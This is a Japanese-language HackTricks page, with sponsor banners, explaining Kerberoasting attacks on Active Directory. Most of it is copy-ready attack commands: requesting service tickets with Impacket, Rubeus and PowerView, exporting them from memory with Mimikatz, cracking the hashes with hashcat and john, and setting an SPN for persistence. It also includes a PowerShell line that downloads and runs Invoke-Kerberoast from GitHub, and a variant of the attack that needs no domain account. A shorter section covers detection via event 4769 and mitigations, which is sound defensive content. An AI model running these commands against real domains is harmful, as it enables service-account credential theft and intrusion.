# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって**強化された** **ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>

**HackTricksをサポートする他の方法：HackTricksで企業を宣伝したい場合やHackTricksをPDFでダウンロードしたい場合は、**[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)**をチェックしてください！**[**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)**を入手してください**[**The PEASS Family**](https://opensea.io/collection/the-peass-family)**を発見し、独占的な**[**NFTs**](https://opensea.io/collection/the-peass-family)**のコレクションを見つけてください💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**または**[**telegramグループ**](https://t.me/peass)**に参加するか、Twitter 🐦** [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。HackTricksと**[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。**

</details>

**KerberoastKerberoastingは、特にActive Directory（AD）内のユーザーアカウントで動作するサービスに関連するTGSチケットの取得に焦点を当てています。これにはコンピューターアカウントは含まれません。これらのチケットの暗号化には、ユーザーパスワードから派生したキーが使用され、オフライン資格情報のクラックの可能性があります。サービスとしてのユーザーアカウントの使用は、空でない\*\*"ServicePrincipalName"\*\*プロパティによって示されます。Kerberoastingを実行するには、TGSチケットを要求できるドメインアカウントが必要です。ただし、このプロセスには特権が必要ではなく、有効なドメイン資格情報を持つ誰でもアクセスできます。キーポイント：Kerberoastingは、AD内のユーザーアカウントサービス向けのTGSチケットを対象としています。ユーザーパスワードからのキーで暗号化されたチケットは、オフラインでクラックできます。サービスは、空でないServicePrincipalNameによって識別されます。特別な特権は必要ありません。単に有効なドメイン資格情報が必要です。攻撃Kerberoastingツールは通常、攻撃を実行し、TGS-REQリクエストを開始する際に\*\*`RC4暗号化`を要求します。これは、RC4が他の暗号化アルゴリズム（AES-128やAES-256など）よりも**[**弱い\*\***](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)**ため、Hashcatなどのツールを使用してオフラインで簡単にクラックできます。**\
**RC4（タイプ23）ハッシュは\*\*`$krb5tgs$23$*`で始まり、AES-256（タイプ18）は`$krb5tgs$18$*`\*\*で始まります。Linux**# Metasploit frameworkmsf> use auxiliary/gather/get\_user\_spns# ImpacketGetUserSPNs.py -request -dc-ip \<DC\_IP> \<DOMAIN.FULL>/\<USERNAME> -outputfile hashes.kerberoast # Password will be promptedGetUserSPNs.py -request -dc-ip \<DC\_IP> -hashes \<LMHASH>:\<NTHASH> \<DOMAIN>/\<USERNAME> -outputfile hashes.kerberoast# kerberoast: https://github.com/skelsec/kerberoastkerberoast ldap spn 'ldap+ntlm-password://\<DOMAIN.FULL>\\\<USERNAME>:\<PASSWORD>@\<DC\_IP>' -o kerberoastable # 1. Enumerate kerberoastable userskerberoast spnroast 'kerberos+password://\<DOMAIN.FULL>\\\<USERNAME>:\<PASSWORD>@\<DC\_IP>' -t kerberoastable\_spn\_users.txt -o kerberoast.hashes # 2. Dump hashes**Kerberoastableユーザーのダンプを含む複数の機能を持つツール:**# ADenum: https://github.com/SecuProject/ADenumadenum -d \<DOMAIN.FULL> -ip \<DC\_IP> -u \<USERNAME> -p \<PASSWORD> -c**WindowsKerberoast可能なユーザーを列挙する**# Get Kerberoastable userssetspn.exe -Q \*/\* #This is a built-in binary. Focus on user accountsGet-NetUser -SPN | select serviceprincipalname #Powerview.\Rubeus.exe kerberoast /stats**手法1: TGSを要求してメモリからダンプする**#Get TGS in memory from a single userAdd-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)setspn.exe -T DOMAIN\_NAME.LOCAL -Q \*/\* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $\_.Context.PostContext\[0].Trim() }#List kerberos tickets in memoryklist# Extract them from memoryInvoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder# Transform kirbi ticket to johnpython2.7 kirbi2john.py sqldev.kirbi# Transform john to hashcatsed 's/\\$krb5tgs\\$\\(.\*\\):\\(.\*\\)/\\$krb5tgs\\$23\\$\\\*\1\\\*\\$\2/' crack\_file > sqldev\_tgs\_hashcat**テクニック2: 自動ツール**# Powerview: Get Kerberoast hash of a userRequest-SPNTicket -SPN "\<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local# Powerview: Get all Kerberoast hashesGet-DomainUser \* -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation# Rubeus.\Rubeus.exe kerberoast /outfile:hashes.kerberoast.\Rubeus.exe kerberoast /user:svc\_mssql /outfile:hashes.kerberoast #Specific user.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins# Invoke-Kerberoastiex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module\_source/credentials/Invoke-Kerberoast.ps1")Invoke-Kerberoast -OutputFormat hashcat | % { $\_.Hash } | Out-File -Encoding ASCII hashes.kerberoast**TGSをリクエストすると、Windowsイベント`4769 - Kerberosサービスチケットが要求されました`が生成されます。**\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)**を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築および自動化できます。**\
**今すぐアクセスしてください：クラッキング**john --format=krb5tgs --wordlist=passwords\_kerb.txt hashes.kerberoasthashcat -m 13100 --force -a 0 hashes.kerberoast passwords\_kerb.txt./tgsrepcrack.py wordlist.txt 1-MSSQLSvc\~sql01.medin.local\~1433-MYDOMAIN.LOCAL.kirbi**永続性ユーザーに十分な権限がある場合、それをKerberoastableにすることができます：**Set-DomainObject -Identity \<username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose**以下は、kerberoast 攻撃に役立つツールが見つかります:** [**https://github.com/nidem/kerberoast**](https://github.com/nidem/kerberoast)**Linux でこのエラーが発生した場合: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`、それはローカル時間の問題です。ホストを DC と同期する必要があります。いくつかのオプションがあります:`ntpdate <DCのIP>` - Ubuntu 16.04 以降非推奨`rdate -n <DCのIP>`緩和策Kerberoasting は、悪用可能な場合に高い潜在性で実行される可能性があります。この活動を検出するためには、Security Event ID 4769 に注意を払う必要があります。これは、Kerberos チケットが要求されたことを示します。ただし、このイベントが頻繁に発生するため、疑わしい活動を分離するために特定のフィルタを適用する必要があります:サービス名が krbtgt であってはならず、これは通常の要求です。$ で終わるサービス名は除外して、サービスに使用されるマシンアカウントを含めないようにします。マシンからの要求は、machine@domain という形式のアカウント名を除外することでフィルタリングされるべきです。失敗コードが '0x0' で識別される成功したチケット要求のみを考慮すべきです。最も重要なのは、チケットの暗号化タイプが 0x17 である必要があります。これは、Kerberoasting 攻撃でよく使用されます。**Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$\_.Message.split("\`n")\[8] -ne 'krbtgt' -and $\_.Message.split("\`n")\[8] -ne '\*$' -and $\_.Message.split("\`n")\[3] -notlike '\*$@\*' -and $\_.Message.split("\`n")\[18] -like '\*0x0\*' -and $\_.Message.split("\`n")\[17] -like "\*0x17\*"} | select ExpandProperty message**Kerberoastリスクの軽減：サービスアカウントのパスワードが推測困難であることを確認し、25文字以上の長さを推奨します。管理されたサービスアカウントを利用し、自動パスワード変更や委任されたサービスプリンシパル名（SPN）管理などの利点を提供し、このような攻撃に対するセキュリティを向上させます。これらの対策を実施することで、組織はKerberoastingに関連するリスクを大幅に軽減できます。ドメインアカウントなしのKerberoast2022年9月に、研究者であるCharlie Clark氏によって新しいシステムの悪用方法が明らかにされ、彼のプラットフォーム**[**exploit.ph**](https://exploit.ph/)**を通じて共有されました。この方法では、KRB\_AS\_REQリクエストを介してサービスチケット（ST）を取得することが可能であり、これによりいかなるActive Directoryアカウントの制御も必要としません。基本的に、プリンシパルが事前認証を必要としないように設定されている場合、サイバーセキュリティ領域で知られるAS-REP Roasting攻撃と似たシナリオが発生し、この特性を利用してリクエストプロセスを操作することができます。具体的には、リクエストの本文内のsname属性を変更することで、システムは標準の暗号化されたチケット発行チケット（TGT）ではなくSTを発行するように騙されます。この技術についての詳細は、この記事で完全に説明されています：**[**Semperisブログ投稿**](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)**。この技術を使用してLDAPをクエリするための有効なアカウントがないため、ユーザーのリストを提供する必要があります。Linux**[**impacket/GetUserSPNs.py from PR #1413**](https://github.com/fortra/impacket/pull/1413)**:**GetUserSPNs.py -no-preauth "NO\_PREAUTH\_USER" -usersfile "LIST\_USERS" -dc-host "dc.domain.local" "domain.local"/**Windows**[**GhostPack/Rubeus from PR #139**](https://github.com/GhostPack/Rubeus/pull/139)**:**Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO\_PREAUTH\_USER" /spn:"TARGET\_SERVICE"**参考文献**[**https://www.tarlogic.com/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/blog/how-to-attack-kerberos/)[**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)[**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)**を使用して、世界で最も高度なコミュニティツールによってパワードされたワークフローを簡単に構築および自動化します。**\
**今すぐアクセスを取得：**
